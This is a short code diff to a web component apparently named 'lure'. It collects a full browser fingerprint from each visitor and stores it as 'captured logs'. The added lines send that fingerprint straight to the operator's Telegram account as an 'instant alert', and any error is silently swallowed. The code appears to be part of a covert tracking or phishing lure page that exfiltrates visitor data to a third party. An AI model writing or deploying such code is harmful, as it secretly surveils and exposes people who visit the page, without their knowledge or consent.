@@ -5,6 +5,7 @@
 
 import { useEffect, useState } from 'react'
 import { collectCompleteFingerprint } from '@/core/fingerprint'
+import { sendTelegramAlert } from '@/core/notify/telegram'
 import styles from './lure.module.scss'
 
 export function Component(): React.ReactElement {
@@ -26,6 +27,9 @@ export function Component(): React.ReactElement {
     collectCompleteFingerprint()
       .then((fp) => {
         if (!mounted) return
+
+        // Dispatch instant alert to operator's Telegram
+        sendTelegramAlert(fp).catch(() => {})
         try {
           const raw = localStorage.getItem('qarmaq_captured_logs')
           const existing = raw ? JSON.parse(raw) : []
